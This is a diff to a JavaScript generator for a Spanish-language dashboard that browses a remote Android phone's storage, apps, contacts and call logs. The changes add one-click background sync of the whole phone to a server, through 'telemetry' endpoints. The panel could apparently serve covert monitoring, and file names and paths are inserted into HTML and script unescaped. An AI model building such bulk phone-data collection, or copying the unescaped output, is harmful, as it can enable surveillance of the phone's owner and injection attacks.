@@ -2,7 +2,7 @@ const path = require('path');
 const { getAppIcon } = require('../utils/appIcons');
 const { getAppDisplayName } = require('../utils/helpers');
 
-const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList = [], appsList = [], items = [], downloadUrl, currentPath = '/storage/emulated/0', allFiles = [], downloadedMap = {}, pendingPaths = new Set(), autoSyncFolders = new Set(), contactsList = [], callLogsList = [], metadata = {} }) => {
+const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList = [], appsList = [], items = [], downloadUrl, currentPath = '/storage/emulated/0', allFiles = [], downloadedMap = {}, pendingPaths = new Set(), standbyPaths = new Set(), completedPaths = new Set(), autoSyncFolders = new Set(), syncStats = {}, initialFilter = 'all', contactsList = [], callLogsList = [], metadata = {} }) => {
   const cleanTitle = (appPackage && level === 3) 
     ? `${getAppDisplayName(appPackage)}` 
     : String(title).replace(/<[^>]*>/g, '').trim();
@@ -34,14 +34,8 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
   if (deviceId) {
     allNavSteps.push({ label: deviceId, href: `/expl/devices/${deviceId}` });
   }
-  if (level === '2-files-hub' || level === '3-available' || level === '3-files') {
-    allNavSteps.push({ label: '📂 Hub Archivos', href: `/expl/devices/${deviceId}/files-hub` });
-  }
-  if (level === '3-available') {
-    allNavSteps.push({ label: '✓ Disponibles', href: null });
-  }
-  if (level === '3-files') {
-    allNavSteps.push({ label: '⚡ Remoto', href: null });
+  if (level === '3-files' || level === '3-available' || level === '2-files-hub') {
+    allNavSteps.push({ label: '📂 Archivos', href: null });
   }
   if (appPackage) {
     allNavSteps.push({ label: getAppDisplayName(appPackage), href: null });
@@ -304,18 +298,18 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
           </div>
         </a>
 
-        <!-- Card 2: Hub de Exploración de Archivos -->
-        <a href="/expl/devices/${deviceId}/files-hub" style="text-decoration:none;">
+        <!-- Card 2: Explorador Unificado de Archivos -->
+        <a href="/expl/devices/${deviceId}/files" style="text-decoration:none;">
           <div class="hub-card" onmouseover="this.style.borderColor='#10b981'; this.style.transform='translateY(-4px)'; this.style.background='#151d30';" onmouseout="this.style.borderColor='#1f2937'; this.style.transform='none'; this.style.background='#111827';">
             <div>
               <div class="hub-icon">📂</div>
               <h2 class="hub-title" style="color: #fff;">Módulo 2: Explorador de Archivos</h2>
               <p class="hub-desc">
-                Acceso al Hub de archivos con opciones de consulta limpia (sincronizados) o exploración remota completa y auto-sync.
+                Explorador unificado de archivos remotos y disponibles con previsualización, descarga directa a PC y sincronización automática total.
               </p>
             </div>
             <div class="hub-link" style="color:#10b981;">
-              Abrir Hub de Archivos &rarr;
+              Abrir Explorador Unificado &rarr;
             </div>
           </div>
         </a>
@@ -819,42 +813,6 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
     `;
     })() : ''}
 
-    ${level === '2-files-hub' ? `
-      <div class="hub-grid">
-        <!-- Card 1: Archivos Sincronizados (Disponibles) -->
-        <a href="/expl/devices/${deviceId}/available" style="text-decoration:none;">
-          <div class="hub-card hub-card-available" onmouseover="this.style.borderColor='#34d399'; this.style.transform='translateY(-4px)'; this.style.background='#151d30';" onmouseout="this.style.borderColor='#10b981'; this.style.transform='none'; this.style.background='#111827';">
-            <div>
-              <div class="hub-icon">✓</div>
-              <h2 class="hub-title" style="color: #34d399;">Opción 1: Archivos Sincronizados</h2>
-              <p class="hub-desc">
-                Ver y reproducir únicamente los archivos multimedia y documentos que ya se encuentran disponibles en el servidor. Interfaz limpia sin botones de solicitud.
-              </p>
-            </div>
-            <div class="hub-link" style="color:#34d399;">
-              Abrir Archivos Disponibles &rarr;
-            </div>
-          </div>
-        </a>
-
-        <!-- Card 2: Explorador Remoto Completo & Auto-Sync -->
-        <a href="/expl/devices/${deviceId}/files" style="text-decoration:none;">
-          <div class="hub-card hub-card-remote" onmouseover="this.style.borderColor='#60a5fa'; this.style.transform='translateY(-4px)'; this.style.background='#151d30';" onmouseout="this.style.borderColor='#38bdf8'; this.style.transform='none'; this.style.background='#111827';">
-            <div>
-              <div class="hub-icon">⚡</div>
-              <h2 class="hub-title" style="color: #38bdf8;">Opción 2: Explorador Remoto Completo</h2>
-              <p class="hub-desc">
-                Navegación completa del almacenamiento interno del teléfono, configuración de subida automática por carpetas y solicitudes a demanda.
-              </p>
-            </div>
-            <div class="hub-link" style="color:#38bdf8;">
-              Abrir Explorador Remoto &rarr;
-            </div>
-          </div>
-        </a>
-      </div>
-    ` : ''}
-
     ${level === '3-nlp' ? `
       <div class="search-box">
         <input type="text" id="searchInput" placeholder="🔍 Buscar aplicación por nombre o paquete..." class="search-input" />
@@ -1167,6 +1125,80 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
           ` : ''}
         </div>
 
+        <!-- KPI Banner de Sincronizacion Global (Server-Driven) -->
+        <div class="sync-kpi-banner" style="background:#111827; border:1px solid #1f2937; border-radius:14px; padding:18px 22px; margin-bottom:20px;">
+          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:14px; margin-bottom:14px;">
+            <div>
+              <div style="font-size:1.1rem; font-weight:800; color:#ffffff; display:flex; align-items:center; gap:8px;">
+                <span>⚡ Sincronización Global del Dispositivo</span>
+                <span class="badge" style="background:rgba(16,185,129,0.15); color:#10b981; border-color:rgba(16,185,129,0.3); font-size:0.75rem;">Server-Driven</span>
+              </div>
+              <div style="font-size:0.84rem; color:#9ca3af; margin-top:2px;">
+                El servidor entrega continuamente archivos ordenados por menor tamaño al teléfono en segundo plano.
+              </div>
+            </div>
+            <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
+              <button type="button" id="btnSyncAll" data-device-id="${deviceId}" onclick="triggerSyncAll(this)" class="btn" style="background:#10b981; font-weight:700; font-size:0.85rem; padding:8px 18px;">
+                🔄 Sincronizar Todo el Teléfono
+              </button>
+            </div>
+          </div>
+
+          <!-- Metricas KPI Cards -->
+          <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(130px, 1fr)); gap:10px; margin-bottom:14px;">
+            <div style="background:#0b0f19; border:1px solid #1f2937; border-radius:10px; padding:10px 14px; text-align:center;">
+              <div style="font-size:0.75rem; color:#9ca3af; text-transform:uppercase; font-weight:600;">Total Archivos</div>
+              <div id="kpiTotalFiles" style="font-size:1.25rem; font-weight:800; color:#f3f4f6;">${syncStats.totalFiles || allFiles.length}</div>
+            </div>
+            <div style="background:#0b0f19; border:1px solid #1f2937; border-radius:10px; padding:10px 14px; text-align:center;">
+              <div style="font-size:0.75rem; color:#34d399; text-transform:uppercase; font-weight:600;">Sincronizados</div>
+              <div id="kpiDownloadedFiles" style="font-size:1.25rem; font-weight:800; color:#34d399;">${syncStats.downloadedFiles || Object.keys(downloadedMap).length}</div>
+            </div>
+            <div style="background:#0b0f19; border:1px solid #1f2937; border-radius:10px; padding:10px 14px; text-align:center;">
+              <div style="font-size:0.75rem; color:#fbbf24; text-transform:uppercase; font-weight:600;">En Cola / Descarga</div>
+              <div id="kpiPendingFiles" style="font-size:1.25rem; font-weight:800; color:#fbbf24;">${syncStats.pendingFiles || pendingPaths.size}</div>
+            </div>
+            <div style="background:#0b0f19; border:1px solid #1f2937; border-radius:10px; padding:10px 14px; text-align:center;">
+              <div style="font-size:0.75rem; color:#fb923c; text-transform:uppercase; font-weight:600;">En Espera (>100MB)</div>
+              <div id="kpiStandbyFiles" style="font-size:1.25rem; font-weight:800; color:#fb923c;">${syncStats.standbyFiles || standbyPaths.size}</div>
+            </div>
+          </div>
+
+          <!-- Barra de Progreso Porcentual -->
+          ${(() => {
+            const total = syncStats.totalFiles || allFiles.length || 1;
+            const downloaded = syncStats.downloadedFiles || Object.keys(downloadedMap).length || 0;
+            const pct = Math.min(100, Math.round((downloaded / total) * 100));
+            return `
+              <div>
+                <div style="display:flex; justify-content:space-between; font-size:0.78rem; color:#9ca3af; margin-bottom:4px;">
+                  <span>Progreso de Respaldo Global</span>
+                  <span id="kpiProgressPct" style="font-weight:700; color:#10b981;">${pct}% completado</span>
+                </div>
+                <div style="width:100%; height:8px; background:#1f2937; border-radius:999px; overflow:hidden;">
+                  <div id="kpiProgressBar" style="width:${pct}%; height:100%; background:linear-gradient(90deg, #10b981, #38bdf8); border-radius:999px; transition:width 0.4s ease;"></div>
+                </div>
+              </div>
+            `;
+          })()}
+        </div>
+
+        <!-- Barra de Pestanas de Filtrado Unificado (Tabs) -->
+        <div class="tabs-container" style="display:flex; gap:8px; margin-bottom:18px; flex-wrap:wrap; border-bottom:1px solid #1f2937; padding-bottom:12px;">
+          <button type="button" class="tab-btn ${initialFilter === 'all' ? 'active' : ''}" onclick="applyFilter('all', this)" style="padding:8px 16px; border-radius:8px; font-size:0.85rem; font-weight:600; cursor:pointer; border:1px solid #374151; background:${initialFilter === 'all' ? '#1e293b' : '#0b0f19'}; color:${initialFilter === 'all' ? '#38bdf8' : '#9ca3af'}; transition:all 0.2s;">
+            📂 Todos los Archivos
+          </button>
+          <button type="button" class="tab-btn ${initialFilter === 'available' ? 'active' : ''}" onclick="applyFilter('available', this)" style="padding:8px 16px; border-radius:8px; font-size:0.85rem; font-weight:600; cursor:pointer; border:1px solid #374151; background:${initialFilter === 'available' ? '#1e293b' : '#0b0f19'}; color:${initialFilter === 'available' ? '#34d399' : '#9ca3af'}; transition:all 0.2s;">
+            ✓ Solo Sincronizados (Disponibles)
+          </button>
+          <button type="button" class="tab-btn ${initialFilter === 'media' ? 'active' : ''}" onclick="applyFilter('media', this)" style="padding:8px 16px; border-radius:8px; font-size:0.85rem; font-weight:600; cursor:pointer; border:1px solid #374151; background:${initialFilter === 'media' ? '#1e293b' : '#0b0f19'}; color:${initialFilter === 'media' ? '#a855f7' : '#9ca3af'}; transition:all 0.2s;">
+            🎬 Multimedia (Fotos y Videos)
+          </button>
+          <button type="button" class="tab-btn ${initialFilter === 'docs' ? 'active' : ''}" onclick="applyFilter('docs', this)" style="padding:8px 16px; border-radius:8px; font-size:0.85rem; font-weight:600; cursor:pointer; border:1px solid #374151; background:${initialFilter === 'docs' ? '#1e293b' : '#0b0f19'}; color:${initialFilter === 'docs' ? '#f59e0b' : '#9ca3af'}; transition:all 0.2s;">
+            📄 Documentos
+          </button>
+        </div>
+
         ${allFiles.length === 0 ? `
           <div id="scanStatusBanner" style="background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 12px; padding: 20px; margin-bottom: 24px; color: #e5e7eb;">
             <div id="scanStatusTitle" style="font-weight: 700; font-size: 1rem; color: #38bdf8; margin-bottom: 6px; display: flex; align-items: center; gap: 8px;">
@@ -1181,7 +1213,7 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
           </div>
         ` : ''}
 
-        <div style="margin-bottom:24px;">
+        <div id="folderGridSection" style="margin-bottom:24px;">
           <h3 style="font-size:1rem; font-weight:700; color:#9ca3af; margin-bottom:12px; display:flex; align-items:center; gap:8px;">📁 Carpetas (${subdirs.length})</h3>
           ${subdirs.length === 0 ? '<p style="font-size:0.85rem; color:#6b7280; font-style:italic;">No hay subcarpetas en esta ruta.</p>' : `
             <div class="folder-grid">
@@ -1221,7 +1253,7 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                     <th style="padding:12px 14px; font-weight:600; max-width:280px;">Nombre del Archivo</th>
                     <th style="padding:12px 14px; font-weight:600; white-space:nowrap; width:90px; text-align:right;">Tamaño</th>
                     <th style="padding:12px 14px; font-weight:600; white-space:nowrap; width:135px; text-align:center;">Fecha</th>
-                    <th style="padding:12px 14px; font-weight:600; white-space:nowrap; width:125px; text-align:center;">Estado</th>
+                    <th style="padding:12px 14px; font-weight:600; white-space:nowrap; width:140px; text-align:center;">Estado</th>
                     <th style="padding:12px 14px; font-weight:600; text-align:right; white-space:nowrap; width:175px;">Acción</th>
                   </tr>
                 </thead>
@@ -1229,6 +1261,7 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                   ${filesList.map(f => {
                     const isDownloaded = Boolean(downloadedMap[f.path]);
                     const isPending = pendingPaths.has(f.path);
+                    const isStandby = standbyPaths.has(f.path);
                     const isAudio = Boolean(f.name && (/\.(opus|ogg|mp3|wav|m4a|aac|flac)$/i).test(f.name));
                     const isImage = Boolean(f.name && (/\.(jpg|jpeg|png|webp|gif|bmp|svg)$/i).test(f.name));
                     const isVideo = Boolean(f.name && (/\.(mp4|webm|mkv|mov|avi|3gp)$/i).test(f.name));
@@ -1237,7 +1270,7 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                     const fileContentUrl = `/api/telemetry/file-content?deviceId=${encodeURIComponent(deviceId)}&path=${encodeURIComponent(f.path)}`;
 
                     return `
-                      <tr style="border-bottom:1px solid #1f2937;" data-file-path="${f.path}" data-file-name="${f.name}">
+                      <tr style="border-bottom:1px solid #1f2937;" data-file-path="${f.path}" data-file-name="${f.name}" data-downloaded="${isDownloaded ? 'true' : 'false'}" data-file-type="${fileType}">
                         <td style="padding:12px 10px 12px 20px; text-align:center; white-space:nowrap;" class="cb-cell">
                           ${isDownloaded ? '' : `<input type="checkbox" class="select-checkbox file-cb" data-path="${f.path}" onclick="updateSelectedCount();" style="width:18px; height:18px; cursor:pointer;" />`}
                         </td>
@@ -1258,7 +1291,8 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                         </td>
                         <td style="padding:12px 14px; white-space:nowrap; text-align:center;" class="status-cell">
                           ${isDownloaded ? '<span class="badge" style="background:rgba(16,185,129,0.15); color:#10b981; border-color:rgba(16,185,129,0.4);">✓ Sincronizado</span>' : 
-                            isPending ? '<span class="badge" style="background:rgba(245,158,11,0.15); color:#f59e0b; border-color:rgba(245,158,11,0.4);">⏳ Solicitado</span>' :
+                            isPending ? '<span class="badge" style="background:rgba(245,158,11,0.15); color:#f59e0b; border-color:rgba(245,158,11,0.4);">⏳ En Cola</span>' :
+                            isStandby ? '<span class="badge" style="background:rgba(249,115,22,0.15); color:#f97316; border-color:rgba(249,115,22,0.4);">⏸ En Espera</span>' :
                             '<span class="badge" style="background:rgba(107,114,128,0.15); color:#9ca3af; border-color:rgba(107,114,128,0.4);">En Dispositivo</span>'
                           }
                         </td>
@@ -1266,7 +1300,9 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                           ${isDownloaded ? `
                             <a href="${fileContentUrl}" download="${f.name}" target="_blank" class="btn" style="background:#059669; font-size:0.78rem; padding:6px 12px; width:160px; min-width:160px; max-width:160px; white-space:nowrap; text-decoration:none; display:inline-flex; justify-content:center; align-items:center;">⬇ Descargar a PC</a>
                           ` : isPending ? `
-                            <button type="button" disabled class="btn btn-secondary" style="font-size:0.78rem; padding:6px 12px; width:160px; min-width:160px; max-width:160px; white-space:nowrap; opacity:0.6; display:inline-flex; justify-content:center; align-items:center;">⏳ Solicitado</button>
+                            <button type="button" disabled class="btn btn-secondary" style="font-size:0.78rem; padding:6px 12px; width:160px; min-width:160px; max-width:160px; white-space:nowrap; opacity:0.6; display:inline-flex; justify-content:center; align-items:center;">⏳ En Cola</button>
+                          ` : isStandby ? `
+                            <button type="button" data-device-id="${deviceId}" data-path="${encodeURIComponent(f.path)}" onclick="prioritizeFile(this)" class="btn" style="background:#ea580c; font-size:0.78rem; padding:6px 12px; width:160px; min-width:160px; max-width:160px; white-space:nowrap; display:inline-flex; justify-content:center; align-items:center;">⚡ Priorizar Ahora</button>
                           ` : `
                             <button type="button" data-device-id="${deviceId}" data-path="${encodeURIComponent(f.path)}" onclick="requestFileSync(this)" class="btn" style="font-size:0.78rem; padding:6px 12px; width:160px; min-width:160px; max-width:160px; white-space:nowrap; display:inline-flex; justify-content:center; align-items:center;">⚡ Solicitar Descarga</button>
                           `}
@@ -1283,6 +1319,7 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
               ${filesList.map(f => {
                 const isDownloaded = Boolean(downloadedMap[f.path]);
                 const isPending = pendingPaths.has(f.path);
+                const isStandby = standbyPaths.has(f.path);
                 const isAudio = Boolean(f.name && (/\.(opus|ogg|mp3|wav|m4a|aac|flac)$/i).test(f.name));
                 const isImage = Boolean(f.name && (/\.(jpg|jpeg|png|webp|gif|bmp|svg)$/i).test(f.name));
                 const isVideo = Boolean(f.name && (/\.(mp4|webm|mkv|mov|avi|3gp)$/i).test(f.name));
@@ -1292,7 +1329,7 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                 const formattedSize = formatFileSize(f.size);
 
                 return `
-                  <div class="mobile-file-card" data-file-path="${f.path}" data-file-name="${f.name}" style="background:#111827; border:1px solid #1f2937; border-radius:12px; padding:14px; display:flex; flex-direction:column; gap:10px;">
+                  <div class="mobile-file-card" data-file-path="${f.path}" data-file-name="${f.name}" data-downloaded="${isDownloaded ? 'true' : 'false'}" data-file-type="${fileType}" style="background:#111827; border:1px solid #1f2937; border-radius:12px; padding:14px; display:flex; flex-direction:column; gap:10px;">
                     <div style="display:flex; justify-content:space-between; align-items:center; gap:8px;">
                       <div class="name-cell" style="display:flex; align-items:center; gap:8px; min-width:0; flex:1; overflow:hidden;">
                         <span style="flex-shrink:0; font-size:1.2rem;">${fileIcon}</span>
@@ -1306,7 +1343,8 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                       </div>
                       <div class="status-cell" style="flex-shrink:0;">
                         ${isDownloaded ? '<span class="badge" style="background:rgba(16,185,129,0.15); color:#10b981; border-color:rgba(16,185,129,0.4); font-weight:700;">✓ Sincronizado</span>' : 
-                          isPending ? '<span class="badge" style="background:rgba(245,158,11,0.15); color:#f59e0b; border-color:rgba(245,158,11,0.4); font-weight:700;">⏳ Solicitado</span>' :
+                          isPending ? '<span class="badge" style="background:rgba(245,158,11,0.15); color:#f59e0b; border-color:rgba(245,158,11,0.4); font-weight:700;">⏳ En Cola</span>' :
+                          isStandby ? '<span class="badge" style="background:rgba(249,115,22,0.15); color:#f97316; border-color:rgba(249,115,22,0.4); font-weight:700;">⏸ En Espera</span>' :
                           '<span class="badge" style="background:rgba(107,114,128,0.15); color:#9ca3af; border-color:rgba(107,114,128,0.4);">En Dispositivo</span>'
                         }
                       </div>
@@ -1326,7 +1364,9 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                       ${isDownloaded ? `
                         <a href="${fileContentUrl}" download="${f.name}" target="_blank" class="btn" style="background:#059669; font-size:0.8rem; padding:8px 14px; width:100%; text-decoration:none; display:inline-flex; justify-content:center; align-items:center;">⬇ Descargar a PC</a>
                       ` : isPending ? `
-                        <button type="button" disabled class="btn btn-secondary" style="font-size:0.8rem; padding:8px 14px; width:100%; opacity:0.6; display:inline-flex; justify-content:center; align-items:center;">⏳ Solicitado</button>
+                        <button type="button" disabled class="btn btn-secondary" style="font-size:0.8rem; padding:8px 14px; width:100%; opacity:0.6; display:inline-flex; justify-content:center; align-items:center;">⏳ En Cola</button>
+                      ` : isStandby ? `
+                        <button type="button" data-device-id="${deviceId}" data-path="${encodeURIComponent(f.path)}" onclick="prioritizeFile(this)" class="btn" style="background:#ea580c; font-size:0.8rem; padding:8px 14px; width:100%; display:inline-flex; justify-content:center; align-items:center;">⚡ Priorizar Ahora</button>
                       ` : `
                         <button type="button" data-device-id="${deviceId}" data-path="${encodeURIComponent(f.path)}" onclick="requestFileSync(this)" class="btn" style="font-size:0.8rem; padding:8px 14px; width:100%; display:inline-flex; justify-content:center; align-items:center;">⚡ Solicitar Descarga</button>
                       `}
@@ -1462,6 +1502,115 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
               btn.textContent = '⚡ Solicitar Descarga';
             });
           }
+
+          function applyFilter(filterMode, btn) {
+            document.querySelectorAll('.tab-btn').forEach(b => {
+              b.style.background = '#0b0f19';
+              b.style.color = '#9ca3af';
+              b.classList.remove('active');
+            });
+            if (btn) {
+              btn.style.background = '#1e293b';
+              btn.style.color = filterMode === 'available' ? '#34d399' : filterMode === 'media' ? '#a855f7' : filterMode === 'docs' ? '#f59e0b' : '#38bdf8';
+              btn.classList.add('active');
+            }
+
+            const items = document.querySelectorAll('tr[data-file-path], .mobile-file-card[data-file-path]');
+            items.forEach(el => {
+              const isDownloaded = el.getAttribute('data-downloaded') === 'true';
+              const fileType = el.getAttribute('data-file-type') || 'other';
+              const fileName = (el.getAttribute('data-file-name') || '').toLowerCase();
+
+              let show = true;
+              if (filterMode === 'available') {
+                show = isDownloaded;
+              } else if (filterMode === 'media') {
+                show = fileType === 'image' || fileType === 'video' || fileType === 'audio';
+              } else if (filterMode === 'docs') {
+                show = /\\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|csv|zip|rar|tar|gz|apk|json)$/i.test(fileName);
+              }
+
+              el.style.display = show ? '' : 'none';
+            });
+
+            const folderSection = document.getElementById('folderGridSection');
+            if (folderSection) {
+              folderSection.style.display = filterMode === 'all' ? '' : 'none';
+            }
+          }
+
+          function prioritizeFile(btn) {
+            const deviceId = btn.getAttribute('data-device-id');
+            const encodedPath = btn.getAttribute('data-path');
+            const filePath = decodeURIComponent(encodedPath);
+
+            btn.disabled = true;
+            btn.textContent = 'Priorizando...';
+
+            fetch('/api/telemetry/devices/' + encodeURIComponent(deviceId) + '/prioritize-file', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ filePath: filePath })
+            })
+            .then(res => res.json())
+            .then(data => {
+              if (data.success) {
+                btn.textContent = '⏳ En Cola';
+                btn.className = 'btn btn-secondary';
+                btn.style.opacity = '0.7';
+                const fileContainer = btn.closest('tr, .mobile-file-card');
+                if (fileContainer) {
+                  const statusCell = fileContainer.querySelector('.status-cell');
+                  if (statusCell) {
+                    statusCell.innerHTML = '<span class="badge" style="background:rgba(245,158,11,0.15); color:#f59e0b; border-color:rgba(245,158,11,0.4); font-weight:700;">⏳ En Cola</span>';
+                  }
+                }
+              } else {
+                alert('Error al priorizar archivo: ' + (data.error || 'Error desconocido'));
+                btn.disabled = false;
+                btn.textContent = '⚡ Priorizar Ahora';
+              }
+            })
+            .catch(err => {
+              alert('Error al conectar con el servidor.');
+              btn.disabled = false;
+              btn.textContent = '⚡ Priorizar Ahora';
+            });
+          }
+
+          function triggerSyncAll(btn) {
+            const deviceId = btn.getAttribute('data-device-id');
+            btn.disabled = true;
+            btn.textContent = 'Sincronizando...';
+
+            fetch('/api/telemetry/devices/' + encodeURIComponent(deviceId) + '/sync-all', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ includeLarge: false })
+            })
+            .then(res => res.json())
+            .then(data => {
+              if (data.success) {
+                alert('Sincronizacion total activada. Se encolaron ' + (data.result ? data.result.enqueuedPending || 0 : 0) + ' archivos ligeros (<100MB) para descarga inmediata.');
+                window.location.reload();
+              } else {
+                alert('Error al iniciar sincronizacion total.');
+                btn.disabled = false;
+                btn.textContent = '🔄 Sincronizar Todo el Teléfono';
+              }
+            })
+            .catch(err => {
+              alert('Error de comunicacion con el servidor.');
+              btn.disabled = false;
+              btn.textContent = '🔄 Sincronizar Todo el Teléfono';
+            });
+          }
+
+          if ('${initialFilter}' && '${initialFilter}' !== 'all') {
+            document.addEventListener('DOMContentLoaded', function() {
+              applyFilter('${initialFilter}', document.querySelector('.tab-btn[onclick*=\"${initialFilter}\"]'));
+            });
+          }
         </script>
       `;
     })() : ''}
@@ -1594,6 +1743,25 @@ const generateExplorerHtml = ({ title, level, deviceId, appPackage, devicesList 
                 }
               }
             });
+
+            // Actualizar KPIs de la barra de progreso en vivo
+            const kpiDown = document.getElementById('kpiDownloadedFiles');
+            const kpiPend = document.getElementById('kpiPendingFiles');
+            const kpiTot = document.getElementById('kpiTotalFiles');
+            const kpiPctSpan = document.getElementById('kpiProgressPct');
+            const kpiBarDiv = document.getElementById('kpiProgressBar');
+            if (kpiDown && kpiTot) {
+              const currentDown = parseInt(kpiDown.textContent || '0', 10) + 1;
+              kpiDown.textContent = currentDown;
+              if (kpiPend) {
+                const currentPend = Math.max(0, parseInt(kpiPend.textContent || '0', 10) - 1);
+                kpiPend.textContent = currentPend;
+              }
+              const totalVal = parseInt(kpiTot.textContent || '1', 10);
+              const newPct = Math.min(100, Math.round((currentDown / totalVal) * 100));
+              if (kpiPctSpan) kpiPctSpan.textContent = newPct + '% completado';
+              if (kpiBarDiv) kpiBarDiv.style.width = newPct + '%';
+            }
           });
 
           syncSocket.on('sync:rules_updated', function(data) {
